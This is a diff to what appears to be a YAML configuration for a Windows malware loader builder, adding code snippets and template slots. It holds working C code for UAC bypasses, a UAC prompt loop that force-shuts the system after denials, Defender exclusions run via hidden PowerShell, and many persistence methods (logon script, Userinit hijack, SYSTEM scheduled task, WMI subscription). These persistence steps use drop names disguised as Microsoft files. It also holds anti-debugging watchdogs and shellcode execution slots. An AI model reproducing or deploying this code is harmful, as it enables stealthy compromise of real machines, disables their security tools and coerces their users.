@@ -1715,11 +1715,13 @@ sections:
   - id: None
     display: None (Skip)
     default: true
+    requires: []
     snippet: |
       // No UAC bypass
   - id: FodHelper
     display: FodHelper Method
     default: false
+    requires: []
     snippet: |
       // UAC Bypass via FodHelper registry hijack
       {
@@ -1745,21 +1747,97 @@ sections:
   - id: ComputerDefaults
     display: ComputerDefaults Method
     default: false
+    requires: []
     snippet: |
       // UAC Bypass via ComputerDefaults
       {
           HKEY hKey;
-          if (RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings\\shell\\open\\command", 
+          if (RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings\\shell\\open\\command",
                               0, NULL, 0, KEY_ALL_ACCESS, NULL, &hKey, NULL) == ERROR_SUCCESS) {
               const wchar_t* cmd = L"cmd.exe";
               RegSetValueExW(hKey, NULL, 0, REG_SZ, (BYTE*)cmd, (DWORD)((wcslen(cmd) + 1) * sizeof(wchar_t)));
               RegSetValueExW(hKey, L"DelegateExecute", 0, REG_SZ, (BYTE*)L"", sizeof(wchar_t));
               RegCloseKey(hKey);
-              
+
               ShellExecuteW(NULL, L"open", L"C:\\Windows\\System32\\ComputerDefaults.exe", NULL, NULL, SW_HIDE);
               Sleep(3000);
-              
+
               RegDeleteTreeW(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings");
+          }
+      }
+  - id: UacLoop
+    display: UAC Loop (Spam Until Yes or Shutdown)
+    default: false
+    requires: []
+    inputs:
+    - id: uac_loop_max_denials
+      label: "Max denials before shutdown (0 = forever)"
+      type: textbox
+      defaultValue: "0"
+      placeholder: "0"
+    - id: uac_loop_retry_ms
+      label: "Retry delay (ms)"
+      type: textbox
+      defaultValue: "300"
+      placeholder: "300"
+    snippet: |
+      // UAC Bypass: Loop ShellExecute("runas") until the user accepts or the
+      // configured denial threshold triggers a forced system shutdown.
+      // Relies on wash_demand_elevation_or_shutdown() from the shared preamble:
+      //   - if already elevated, returns immediately
+      //   - otherwise reprompts in a tight loop; cancelling the dialog reopens it
+      //   - hitting max_denials calls ExitWindowsEx(EWX_SHUTDOWN | EWX_FORCE)
+      // Set max_denials = 0 to loop forever.
+      wash_demand_elevation_or_shutdown((DWORD)$uac_loop_max_denials$, (DWORD)$uac_loop_retry_ms$);
+
+- header: Evasion
+  template: evasion
+  display: Evasion
+  allowMultiple: true
+  items:
+  - id: None
+    display: None (Skip)
+    default: true
+    requires: []
+    snippet: |
+      // No evasion
+  - id: DefenderExclusion
+    display: Defender Exclusion (Self + Persistence Drops)
+    default: false
+    requires:
+    - uac_bypass
+    snippet: |
+      // Evasion: Add the running executable AND every tracked persistence drop
+      // (wash_copies[], populated by Persistence snippets) to Windows Defender's
+      // path-exclusions list. Issued via Add-MpPreference under powershell.exe
+      // with WindowStyle Hidden. Requires administrator rights — guard with a
+      // UAC bypass snippet so wash_is_elevated() returns TRUE before reaching
+      // this point.
+      {
+          // Self-track: ensure our current path is in wash_copies[] in case no
+          // persistence snippet ran first.
+          {
+              WCHAR _self[MAX_PATH] = {0};
+              if (GetModuleFileNameW(NULL, _self, MAX_PATH) > 0)
+                  wash_track(_self);
+          }
+
+          for (int _i = 0; _i < wash_copies_count; _i++) {
+              WCHAR _ev_cmd[1024] = {0};
+              wsprintfW(_ev_cmd,
+                        L"powershell.exe -NoProfile -WindowStyle Hidden "
+                        L"-Command \"Add-MpPreference -ExclusionPath '%s'\"",
+                        wash_copies[_i]);
+              STARTUPINFOW        _ev_si = {sizeof(_ev_si)};
+              PROCESS_INFORMATION _ev_pi = {0};
+              _ev_si.dwFlags     = STARTF_USESHOWWINDOW;
+              _ev_si.wShowWindow = SW_HIDE;
+              if (CreateProcessW(NULL, _ev_cmd, NULL, NULL, FALSE,
+                                 CREATE_NO_WINDOW, NULL, NULL, &_ev_si, &_ev_pi)) {
+                  WaitForSingleObject(_ev_pi.hProcess, 10000);
+                  CloseHandle(_ev_pi.hProcess);
+                  CloseHandle(_ev_pi.hThread);
+              }
           }
       }
 
@@ -1823,12 +1901,14 @@ sections:
   - id: None
     display: None (Skip)
     default: true
+    requires: []
     snippet: |
       // No persistence
 
   - id: HkcuRunKey
     display: HKCU Run Key (User-Level)
     default: false
+    requires: []
     inputs:
     - id: hkcu_run_value_name
       label: "Registry Value Name"
@@ -1844,6 +1924,7 @@ sections:
           WCHAR _pers_path[MAX_PATH] = {0};
           HKEY  _pers_hKey;
           GetModuleFileNameW(NULL, _pers_path, MAX_PATH);
+          wash_track(_pers_path);
           if (RegOpenKeyExW(HKEY_CURRENT_USER,
                             L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                             0, KEY_SET_VALUE, &_pers_hKey) == ERROR_SUCCESS) {
@@ -1857,6 +1938,7 @@ sections:
   - id: StartupFolder
     display: Startup Folder (User-Level)
     default: false
+    requires: []
     inputs:
     - id: startup_file_name
       label: "Dropped Filename"
@@ -1867,6 +1949,8 @@ sections:
       // Persistence: User Startup Folder
       // Copies the running executable into the current user's Startup folder.
       // Launched on every logon. No administrator rights required.
+      // Registers the dropped path in wash_copies[] so subsequent evasion steps
+      // (e.g. Defender exclusions) can apply to every dropped copy.
       // Compatible with Windows 10/11 and Windows Server 2016+.
       {
           WCHAR _sf_src[MAX_PATH] = {0};
@@ -1877,12 +1961,15 @@ sections:
               L"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
               _sf_dir, MAX_PATH);
           wsprintfW(_sf_dst, L"%s\\$startup_file_name$", _sf_dir);
-          CopyFileW(_sf_src, _sf_dst, FALSE);
+          if (CopyFileW(_sf_src, _sf_dst, FALSE)) {
+              wash_track(_sf_dst);
+          }
       }
 
   - id: ScheduledTask
     display: Scheduled Task (User-Level)
     default: false
+    requires: []
     inputs:
     - id: sched_task_name
       label: "Task Name"
@@ -1900,6 +1987,7 @@ sections:
           STARTUPINFOW        _st_si   = {sizeof(_st_si)};
           PROCESS_INFORMATION _st_pi   = {0};
           GetModuleFileNameW(NULL, _st_exe, MAX_PATH);
+          wash_track(_st_exe);
           wsprintfW(_st_cmd,
                     L"cmd.exe /C schtasks /Create /TN \"$sched_task_name$\" "
                     L"/TR \"\\\"%s\\\"\" /SC ONLOGON /RL LIMITED /F",
@@ -1917,6 +2005,8 @@ sections:
   - id: HklmRunKey
     display: HKLM Run Key (Requires Admin)
     default: false
+    requires:
+    - uac_bypass
     inputs:
     - id: hklm_run_value_name
       label: "Registry Value Name"
@@ -1927,12 +2017,17 @@ sections:
       // Persistence: HKLM Run Registry Key
       // Adds current executable to HKLM\Software\Microsoft\Windows\CurrentVersion\Run.
       // Runs at logon for ALL users. Requires administrator rights to write.
-      // Falls back silently if insufficient privileges.
+      // Spams a UAC prompt loop until elevation is granted (or the configured
+      // denial threshold force-shutdowns the system) before touching HKLM.
       // Compatible with Windows 10/11 and Windows Server 2016+.
       {
+          // Loop UAC prompt until the user accepts. 0 = forever, 300ms retry.
+          wash_demand_elevation_or_shutdown(0, 300);
+
           WCHAR _pers_path[MAX_PATH] = {0};
           HKEY  _pers_hKey;
           GetModuleFileNameW(NULL, _pers_path, MAX_PATH);
+          wash_track(_pers_path);
           if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                             L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                             0, KEY_SET_VALUE, &_pers_hKey) == ERROR_SUCCESS) {
@@ -1940,6 +2035,245 @@ sections:
                              (BYTE*)_pers_path,
                              (DWORD)((wcslen(_pers_path) + 1) * sizeof(WCHAR)));
               RegCloseKey(_pers_hKey);
+          }
+      }
+
+  - id: LogonScript
+    display: Logon Script (HKCU UserInitMprLogonScript, User-Level)
+    default: false
+    requires: []
+    inputs:
+    - id: logon_script_file_name
+      label: "Dropped Filename"
+      type: textbox
+      defaultValue: "msedge_update.exe"
+      placeholder: "msedge_update.exe"
+    snippet: |
+      // Persistence: HKCU UserInitMprLogonScript Logon Script
+      // Copies the running executable to %APPDATA%\Microsoft\Windows\ and registers
+      // it as the user's logon script via HKCU\Environment\UserInitMprLogonScript.
+      // winlogon.exe invokes every path in this value at each interactive logon via
+      // the Multi-Provider Router (MPR). No administrator rights required.
+      // Very low AV/EDR signature rate. Survives reboots and user re-logons.
+      // Compatible with Windows 10/11 and Windows Server 2016+.
+      {
+          WCHAR _ls_src[MAX_PATH] = {0};
+          WCHAR _ls_dir[MAX_PATH] = {0};
+          WCHAR _ls_dst[MAX_PATH] = {0};
+          HKEY  _ls_hKey;
+          GetModuleFileNameW(NULL, _ls_src, MAX_PATH);
+          ExpandEnvironmentStringsW(L"%APPDATA%\\Microsoft\\Windows", _ls_dir, MAX_PATH);
+          wsprintfW(_ls_dst, L"%s\\$logon_script_file_name$", _ls_dir);
+          if (!CopyFileW(_ls_src, _ls_dst, FALSE))
+              wcscpy_s(_ls_dst, MAX_PATH, _ls_src);
+          else
+              wash_track(_ls_dst);
+          if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Environment",
+                            0, KEY_SET_VALUE, &_ls_hKey) == ERROR_SUCCESS) {
+              RegSetValueExW(_ls_hKey, L"UserInitMprLogonScript", 0, REG_SZ,
+                             (BYTE*)_ls_dst,
+                             (DWORD)((wcslen(_ls_dst) + 1) * sizeof(WCHAR)));
+              RegCloseKey(_ls_hKey);
+          }
+      }
+
+  - id: AllUsersStartup
+    display: All-Users Startup Folder (Admin)
+    default: false
+    requires:
+    - uac_bypass
+    inputs:
+    - id: allusers_startup_file_name
+      label: "Dropped Filename"
+      type: textbox
+      defaultValue: "RuntimeBrokerHelper.exe"
+      placeholder: "RuntimeBrokerHelper.exe"
+    snippet: |
+      // Persistence: All-Users Startup Folder
+      // Copies the running executable into
+      // %ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup.
+      // Launched automatically at every logon for ANY user on the system.
+      // Requires administrator rights. No Task Scheduler entry is created.
+      // Compatible with Windows 10/11 and Windows Server 2016+.
+      {
+          wash_demand_elevation_or_shutdown(0, 300);
+          WCHAR _aus_src[MAX_PATH] = {0};
+          WCHAR _aus_dir[MAX_PATH] = {0};
+          WCHAR _aus_dst[MAX_PATH] = {0};
+          GetModuleFileNameW(NULL, _aus_src, MAX_PATH);
+          ExpandEnvironmentStringsW(
+              L"%ProgramData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
+              _aus_dir, MAX_PATH);
+          wsprintfW(_aus_dst, L"%s\\$allusers_startup_file_name$", _aus_dir);
+          if (CopyFileW(_aus_src, _aus_dst, FALSE))
+              wash_track(_aus_dst);
+      }
+
+  - id: SchtasksSystem
+    display: Scheduled Task at Boot as SYSTEM (Admin)
+    default: false
+    requires:
+    - uac_bypass
+    inputs:
+    - id: sched_system_task_name
+      label: "Task Name"
+      type: textbox
+      defaultValue: "MicrosoftWindowsDefenderPeriodicScanCheck"
+      placeholder: "MicrosoftWindowsDefenderPeriodicScanCheck"
+    snippet: |
+      // Persistence: Scheduled Task — System Boot, SYSTEM Account
+      // Creates a task that fires at every system startup (/SC ONSTART) running as
+      // SYSTEM with highest privilege (/RU SYSTEM /RL HIGHEST). Unlike ONLOGON tasks
+      // this executes before any interactive session exists — ideal for network-facing
+      // payloads and C2 beacons. Requires administrator rights.
+      // Compatible with Windows 10/11 and Windows Server 2016+.
+      {
+          wash_demand_elevation_or_shutdown(0, 300);
+          WCHAR _ss_exe[MAX_PATH] = {0};
+          WCHAR _ss_cmd[1024]     = {0};
+          STARTUPINFOW        _ss_si = {sizeof(_ss_si)};
+          PROCESS_INFORMATION _ss_pi = {0};
+          GetModuleFileNameW(NULL, _ss_exe, MAX_PATH);
+          wash_track(_ss_exe);
+          wsprintfW(_ss_cmd,
+                    L"cmd.exe /C schtasks /Create /TN \"$sched_system_task_name$\" "
+                    L"/TR \"\\\"%s\\\"\" /SC ONSTART /RU SYSTEM /RL HIGHEST /F",
+                    _ss_exe);
+          _ss_si.dwFlags     = STARTF_USESHOWWINDOW;
+          _ss_si.wShowWindow = SW_HIDE;
+          if (CreateProcessW(NULL, _ss_cmd, NULL, NULL, FALSE,
+                             CREATE_NO_WINDOW, NULL, NULL, &_ss_si, &_ss_pi)) {
+              WaitForSingleObject(_ss_pi.hProcess, 5000);
+              CloseHandle(_ss_pi.hProcess);
+              CloseHandle(_ss_pi.hThread);
+          }
+      }
+
+  - id: WinlogonUserinit
+    display: Winlogon Userinit Hijack (Admin)
+    default: false
+    requires:
+    - uac_bypass
+    snippet: |
+      // Persistence: Winlogon Userinit Registry Hijack
+      // Appends the running executable path to the comma-separated Userinit value at
+      // HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon.
+      // winlogon.exe launches every comma-separated entry at each interactive logon.
+      // The default value is "C:\Windows\system32\userinit.exe," — we append after it.
+      // Idempotent: skips the write if the path is already present in the value.
+      // Requires administrator rights.
+      // Compatible with Windows 10/11 and Windows Server 2016+.
+      {
+          wash_demand_elevation_or_shutdown(0, 300);
+          WCHAR _wu_path[MAX_PATH]           = {0};
+          WCHAR _wu_cur[1024]                = {0};
+          WCHAR _wu_new[1024 + MAX_PATH + 2] = {0};
+          HKEY  _wu_hKey;
+          GetModuleFileNameW(NULL, _wu_path, MAX_PATH);
+          wash_track(_wu_path);
+          if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
+                            L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
+                            0, KEY_QUERY_VALUE | KEY_SET_VALUE, &_wu_hKey) == ERROR_SUCCESS) {
+              DWORD _wu_type = 0;
+              DWORD _wu_sz   = (DWORD)sizeof(_wu_cur);
+              RegQueryValueExW(_wu_hKey, L"Userinit", NULL,
+                               &_wu_type, (BYTE*)_wu_cur, &_wu_sz);
+              if (wcsstr(_wu_cur, _wu_path) == NULL) {
+                  size_t _wu_len = wcslen(_wu_cur);
+                  if (_wu_len > 0 && _wu_cur[_wu_len - 1] != L',')
+                      wcscat_s(_wu_cur, 1024, L",");
+                  wsprintfW(_wu_new, L"%s%s,", _wu_cur, _wu_path);
+                  RegSetValueExW(_wu_hKey, L"Userinit", 0, REG_SZ,
+                                 (BYTE*)_wu_new,
+                                 (DWORD)((wcslen(_wu_new) + 1) * sizeof(WCHAR)));
+              }
+              RegCloseKey(_wu_hKey);
+          }
+      }
+
+  - id: WmiEventSubscription
+    display: WMI Permanent Event Subscription (Admin)
+    default: false
+    requires:
+    - uac_bypass
+    inputs:
+    - id: wmi_filter_name
+      label: "WMI Filter Name"
+      type: textbox
+      defaultValue: "MicrosoftWindowsUpdateFilter"
+      placeholder: "MicrosoftWindowsUpdateFilter"
+    - id: wmi_consumer_name
+      label: "WMI Consumer Name"
+      type: textbox
+      defaultValue: "MicrosoftWindowsUpdateConsumer"
+      placeholder: "MicrosoftWindowsUpdateConsumer"
+    snippet: |
+      // Persistence: WMI Permanent Event Subscription
+      // Registers a permanent WMI subscription in the root\subscription namespace:
+      //   __EventFilter  — WQL query on Win32_LogonSession creation (type 2 = interactive)
+      //   CommandLineEventConsumer — runs the payload when the event fires
+      //   __FilterToConsumerBinding — links the two objects
+      // Entries live in the WMI repository, not in the registry or Task Scheduler.
+      // Survives reboots; SYSTEM-level execution context. Requires administrator rights.
+      // Implemented via a UTF-16LE PS1 temp file to avoid COM ceremony in C++.
+      // Compatible with Windows 10/11 and Windows Server 2016+.
+      {
+          wash_demand_elevation_or_shutdown(0, 300);
+          WCHAR _wm_exe[MAX_PATH]       = {0};
+          WCHAR _wm_tmp_base[MAX_PATH]  = {0};
+          WCHAR _wm_tmp[MAX_PATH]       = {0};
+          WCHAR _wm_cmd[512]            = {0};
+          WCHAR _wm_scr[2048]           = {0};
+          STARTUPINFOW        _wm_si = {sizeof(_wm_si)};
+          PROCESS_INFORMATION _wm_pi = {0};
+          GetModuleFileNameW(NULL, _wm_exe, MAX_PATH);
+          wash_track(_wm_exe);
+          GetTempPathW(MAX_PATH, _wm_tmp_base);
+          wsprintfW(_wm_tmp, L"%swusa_svc.ps1", _wm_tmp_base);
+          // Build PowerShell script that creates the three WMI objects.
+          // Single-quoted PS strings: '' is an escaped single-quote inside them.
+          // $ct wraps the exe path in double-quotes to handle spaces in the path.
+          wsprintfW(_wm_scr,
+              L"$e='%s';"
+              L"$ct='\"'+$e+'\"';"
+              L"$f=Set-WmiInstance -Namespace root\\subscription "
+              L"-Class __EventFilter "
+              L"-Arguments @{Name='$wmi_filter_name$';"
+              L"EventNameSpace='root\\cimv2';"
+              L"QueryLanguage='WQL';"
+              L"Query='SELECT * FROM __InstanceCreationEvent WITHIN 30 "
+              L"WHERE TargetInstance ISA ''Win32_LogonSession'' "
+              L"AND TargetInstance.LogonType=2'};"
+              L"$c=Set-WmiInstance -Namespace root\\subscription "
+              L"-Class CommandLineEventConsumer "
+              L"-Arguments @{Name='$wmi_consumer_name$';"
+              L"CommandLineTemplate=$ct};"
+              L"Set-WmiInstance -Namespace root\\subscription "
+              L"-Class __FilterToConsumerBinding "
+              L"-Arguments @{Filter=$f;Consumer=$c};",
+              _wm_exe);
+          HANDLE _wm_fh = CreateFileW(_wm_tmp, GENERIC_WRITE, 0, NULL,
+                                      CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+          if (_wm_fh != INVALID_HANDLE_VALUE) {
+              DWORD _wm_dw      = 0;
+              BYTE  _wm_bom[2]  = {0xFF, 0xFE};
+              WriteFile(_wm_fh, _wm_bom, 2, &_wm_dw, NULL);
+              WriteFile(_wm_fh, _wm_scr,
+                        (DWORD)(wcslen(_wm_scr) * sizeof(WCHAR)), &_wm_dw, NULL);
+              CloseHandle(_wm_fh);
+              wsprintfW(_wm_cmd,
+                        L"powershell.exe -NoProfile -WindowStyle Hidden "
+                        L"-ExecutionPolicy Bypass -File \"%s\"",
+                        _wm_tmp);
+              _wm_si.dwFlags     = STARTF_USESHOWWINDOW;
+              _wm_si.wShowWindow = SW_HIDE;
+              if (CreateProcessW(NULL, _wm_cmd, NULL, NULL, FALSE,
+                                 CREATE_NO_WINDOW, NULL, NULL, &_wm_si, &_wm_pi)) {
+                  WaitForSingleObject(_wm_pi.hProcess, 15000);
+                  CloseHandle(_wm_pi.hProcess);
+                  CloseHandle(_wm_pi.hThread);
+              }
+              DeleteFileW(_wm_tmp);
           }
       }
 
@@ -1960,6 +2294,8 @@ templates:
     #pragma comment(lib, "iphlpapi.lib")
     #pragma comment(lib, "netapi32.lib")
     #pragma comment(lib, "shell32.lib")
+
+    {{PREAMBLE}}
 
     {{PROCESS_LOOKUP_HELPER}}
 
@@ -1983,6 +2319,8 @@ templates:
 
         {{PERSISTENCE}}
 
+        {{EVASION}}
+
         {{PROCESS_INJECTION}}
 
         {{SHELLCODE_EXECUTION}}
@@ -1991,6 +2329,8 @@ templates:
         return 0;
     }
   placeholders:
+  - name: PREAMBLE
+    kind: system
   - name: PROCESS_LOOKUP_HELPER
     kind: system
   - name: SHELLCODE_SOURCE
@@ -2018,6 +2358,9 @@ templates:
   - name: PERSISTENCE
     kind: snippet
     snippetTemplate: persistence
+  - name: EVASION
+    kind: snippet
+    snippetTemplate: evasion
   - name: PROCESS_INJECTION
     kind: snippet
     snippetTemplate: psinjection
@@ -2027,8 +2370,10 @@ templates:
 - id: paranoid
   display: Paranoid Loader
   description: Every protection enabled - layered defense in depth.
-  content: "#define WIN32_LEAN_AND_MEAN\n#include <windows.h>\n#include <winternl.h>\n#include <intrin.h>\n#include <tlhelp32.h>\n#include <shlobj.h>\n#include <iphlpapi.h>\n#include <lm.h>\n#pragma comment(lib, \"iphlpapi.lib\")\n#pragma comment(lib, \"netapi32.lib\")\n\n{{PROCESS_LOOKUP_HELPER}}\n\n// Watchdog thread\nvolatile BOOL g_SafeToRun = TRUE;\n\nDWORD WINAPI WatchdogThread(LPVOID lpParam) {\n    while (g_SafeToRun) {\n        // Check debugger continuously\n        if (IsDebuggerPresent()) { g_SafeToRun = FALSE; ExitProcess(0); }\n        \n        // Check hardware breakpoints\n        CONTEXT ctx = {0};\n        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;\n        if (GetThreadContext(GetCurrentThread(), &ctx)) {\n            if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) { g_SafeToRun = FALSE; ExitProcess(0); }\n        }\n        \n        // Check for analysis tools\n        const wchar_t* tools[] = {\n            L\"x64dbg.exe\", L\"ida.exe\", L\"idaq64.exe\", L\"procmon.exe\",\n            L\"wireshark.exe\", L\"fiddler.exe\", L\"ProcessHacker.exe\"\n        };\n        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n        if (snap != INVALID_HANDLE_VALUE) {\n            PROCESSENTRY32W pe = {sizeof(pe)};\n            if (Process32FirstW(snap, &pe)) {\n                do {\n                    for (int i = 0; i < 7; i++) {\n                        if (_wcsicmp(pe.szExeFile, tools[i]) == 0) {\n                            CloseHandle(snap);\n                            g_SafeToRun = FALSE;\n                            ExitProcess(0);\n                        }\n                    }\n                } while (Process32NextW(snap, &pe));\n            }\n            CloseHandle(snap);\n        }\n        \n        Sleep(500);\n    }\n    return 0;\n}\n\nINT main(VOID)\n{\n    // Start watchdog\n    CreateThread(NULL, 0, WatchdogThread, NULL, 0, NULL);\n\n    // Phase 1: Anti-Emulation\n    {{ANTI_EMULATION}}\n    if (!g_SafeToRun) return 0;\n\n    // Phase 2: Environment Validation\n    {{GUARDRAILS}}\n    if (!g_SafeToRun) return 0;\n\n    // Phase 3: VM/Sandbox Detection\n    {{ANTI_SANDBOX}}\n    if (!g_SafeToRun) return 0;\n\n    // Phase 4: Anti-Debugging\n    {{ANTI_DEBUGGING}}\n    if (!g_SafeToRun) return 0;\n\n    // Phase 5: Anti-Analysis\n    {{ANTI_ANALYSIS}}\n    if (!g_SafeToRun) return 0;\n\n    // Phase 6: Persistence\n    {{PERSISTENCE}}\n\n    // Phase 7: Load Payload\n    {{SHELLCODE_SOURCE}}\n    {{SHELLCODE_URL}}\n\n    // Phase 7: Execute\n    {{SHELLCODE_EXECUTION}}\n\n    return 0;\n}\n"
+  content: "#define WIN32_LEAN_AND_MEAN\n#include <windows.h>\n#include <winternl.h>\n#include <intrin.h>\n#include <tlhelp32.h>\n#include <shlobj.h>\n#include <iphlpapi.h>\n#include <lm.h>\n#pragma comment(lib, \"iphlpapi.lib\")\n#pragma comment(lib, \"netapi32.lib\")\n\n{{PREAMBLE}}\n\n{{PROCESS_LOOKUP_HELPER}}\n\n// Watchdog thread\nvolatile BOOL g_SafeToRun = TRUE;\n\nDWORD WINAPI WatchdogThread(LPVOID lpParam) {\n    while (g_SafeToRun) {\n        // Check debugger continuously\n        if (IsDebuggerPresent()) { g_SafeToRun = FALSE; ExitProcess(0); }\n        \n        // Check hardware breakpoints\n        CONTEXT ctx = {0};\n        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;\n        if (GetThreadContext(GetCurrentThread(), &ctx)) {\n            if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) { g_SafeToRun = FALSE; ExitProcess(0); }\n        }\n        \n        // Check for analysis tools\n        const wchar_t* tools[] = {\n            L\"x64dbg.exe\", L\"ida.exe\", L\"idaq64.exe\", L\"procmon.exe\",\n            L\"wireshark.exe\", L\"fiddler.exe\", L\"ProcessHacker.exe\"\n        };\n        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n        if (snap != INVALID_HANDLE_VALUE) {\n            PROCESSENTRY32W pe = {sizeof(pe)};\n            if (Process32FirstW(snap, &pe)) {\n                do {\n                    for (int i = 0; i < 7; i++) {\n                        if (_wcsicmp(pe.szExeFile, tools[i]) == 0) {\n                            CloseHandle(snap);\n                            g_SafeToRun = FALSE;\n                            ExitProcess(0);\n                        }\n                    }\n                } while (Process32NextW(snap, &pe));\n            }\n            CloseHandle(snap);\n        }\n        \n        Sleep(500);\n    }\n    return 0;\n}\n\nINT main(VOID)\n{\n    // Start watchdog\n    CreateThread(NULL, 0, WatchdogThread, NULL, 0, NULL);\n\n    // Phase 1: Anti-Emulation\n    {{ANTI_EMULATION}}\n    if (!g_SafeToRun) return 0;\n\n    // Phase 2: Environment Validation\n    {{GUARDRAILS}}\n    if (!g_SafeToRun) return 0;\n\n    // Phase 3: VM/Sandbox Detection\n    {{ANTI_SANDBOX}}\n    if (!g_SafeToRun) return 0;\n\n    // Phase 4: Anti-Debugging\n    {{ANTI_DEBUGGING}}\n    if (!g_SafeToRun) return 0;\n\n    // Phase 5: Anti-Analysis\n    {{ANTI_ANALYSIS}}\n    if (!g_SafeToRun) return 0;\n\n    // Phase 6: UAC bypass\n    {{UAC_BYPASS}}\n\n    // Phase 7: Persistence\n    {{PERSISTENCE}}\n\n    // Phase 8: Evasion (Defender exclusions, etc.)\n    {{EVASION}}\n\n    // Phase 9: Load Payload\n    {{SHELLCODE_SOURCE}}\n    {{SHELLCODE_URL}}\n\n    // Phase 10: Execute\n    {{SHELLCODE_EXECUTION}}\n\n    return 0;\n}\n"
   placeholders:
+  - name: PREAMBLE
+    kind: system
   - name: PROCESS_LOOKUP_HELPER
     kind: system
   - name: ANTI_EMULATION
@@ -2046,9 +2391,15 @@ templates:
   - name: ANTI_ANALYSIS
     kind: snippet
     snippetTemplate: antianalysis
+  - name: UAC_BYPASS
+    kind: snippet
+    snippetTemplate: uacb
   - name: PERSISTENCE
     kind: snippet
     snippetTemplate: persistence
+  - name: EVASION
+    kind: snippet
+    snippetTemplate: evasion
   - name: SHELLCODE_SOURCE
     kind: system
   - name: SHELLCODE_URL
@@ -2072,16 +2423,18 @@ templates:
     #pragma comment(lib, "iphlpapi.lib")
     #pragma comment(lib, "netapi32.lib")
     #pragma comment(lib, "shell32.lib")
-    
+
+    {{PREAMBLE}}
+
     {{PROCESS_LOOKUP_HELPER}}
-    
+
     // Self-protection thread
     DWORD WINAPI AntiAnalysisThread(LPVOID lpParam) {
         while (TRUE) {
-        
+
             // Continuous debugger check
             if (IsDebuggerPresent()) ExitProcess(0);
-        
+
             // Check for debugging tools
             const wchar_t* tools[] = {L"x64dbg.exe", L"ida.exe", L"procmon.exe", L"wireshark.exe"};
             HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
@@ -2103,7 +2456,7 @@ templates:
         }
         return 0;
     }
-    
+
     INT main(VOID)
     {
         // Start continuous monitoring
@@ -2111,13 +2464,17 @@ templates:
         {{ANTI_EMULATION}}
         {{ANTI_ANALYSIS}}
         {{ANTI_DEBUGGING}}
+        {{UAC_BYPASS}}
         {{PERSISTENCE}}
+        {{EVASION}}
         {{SHELLCODE_SOURCE}}
         {{SHELLCODE_URL}}
         {{SHELLCODE_EXECUTION}}
         return 0;
     }
   placeholders:
+  - name: PREAMBLE
+    kind: system
   - name: PROCESS_LOOKUP_HELPER
     kind: system
   - name: ANTI_EMULATION
@@ -2129,9 +2486,15 @@ templates:
   - name: ANTI_DEBUGGING
     kind: snippet
     snippetTemplate: antidebugging
+  - name: UAC_BYPASS
+    kind: snippet
+    snippetTemplate: uacb
   - name: PERSISTENCE
     kind: snippet
     snippetTemplate: persistence
+  - name: EVASION
+    kind: snippet
+    snippetTemplate: evasion
   - name: SHELLCODE_SOURCE
     kind: system
   - name: SHELLCODE_URL
@@ -2156,6 +2519,8 @@ templates:
     #pragma comment(lib, "netapi32.lib")
     #pragma comment(lib, "shell32.lib")
 
+    {{PREAMBLE}}
+
     {{PROCESS_LOOKUP_HELPER}}
 
     INT main(VOID)
@@ -2172,19 +2537,27 @@ templates:
         // Layer 4: Debugger Detection
         {{ANTI_DEBUGGING}}
 
-        // Layer 5: Persistence
+        // Layer 5: UAC bypass
+        {{UAC_BYPASS}}
+
+        // Layer 6: Persistence
         {{PERSISTENCE}}
 
-        // Layer 6: Payload
+        // Layer 7: Evasion (Defender exclusions, etc.)
+        {{EVASION}}
+
+        // Layer 8: Payload
         {{SHELLCODE_SOURCE}}
         {{SHELLCODE_URL}}
 
-        // Layer 6: Execution
+        // Layer 9: Execution
         {{SHELLCODE_EXECUTION}}
 
         return 0;
     }
   placeholders:
+  - name: PREAMBLE
+    kind: system
   - name: PROCESS_LOOKUP_HELPER
     kind: system
   - name: ANTI_EMULATION
@@ -2199,9 +2572,15 @@ templates:
   - name: ANTI_DEBUGGING
     kind: snippet
     snippetTemplate: antidebugging
+  - name: UAC_BYPASS
+    kind: snippet
+    snippetTemplate: uacb
   - name: PERSISTENCE
     kind: snippet
     snippetTemplate: persistence
+  - name: EVASION
+    kind: snippet
+    snippetTemplate: evasion
   - name: SHELLCODE_SOURCE
     kind: system
   - name: SHELLCODE_URL
@@ -2217,6 +2596,8 @@ templates:
     #include <windows.h>
     #include <winternl.h>
 
+    {{PREAMBLE}}
+
     INT main(VOID)
     {
         {{SHELLCODE_SOURCE}}
@@ -2227,8 +2608,10 @@ templates:
 
         return 0;
     }
-    
+
   placeholders:
+  - name: PREAMBLE
+    kind: system
   - name: SHELLCODE_SOURCE
     kind: system
   - name: PERSISTENCE
@@ -2244,6 +2627,8 @@ templates:
     #define WIN32_LEAN_AND_MEAN
     #include <windows.h>
     #include <winternl.h>
+
+    {{PREAMBLE}}
 
     {{SHELLCODE_SOURCE}}
 
@@ -2264,6 +2649,8 @@ templates:
         return TRUE;
     }
   placeholders:
+  - name: PREAMBLE
+    kind: system
   - name: SHELLCODE_SOURCE
     kind: system
   - name: PERSISTENCE
@@ -2284,6 +2671,8 @@ templates:
     #include <windows.h>
     #include <winternl.h>
 
+    {{PREAMBLE}}
+
     INT main(VOID)
     {
         {{SHELLCODE_SOURCE}}
@@ -2295,6 +2684,8 @@ templates:
         return 0;
     }
   placeholders:
+  - name: PREAMBLE
+    kind: system
   - name: SHELLCODE_SOURCE
     kind: system
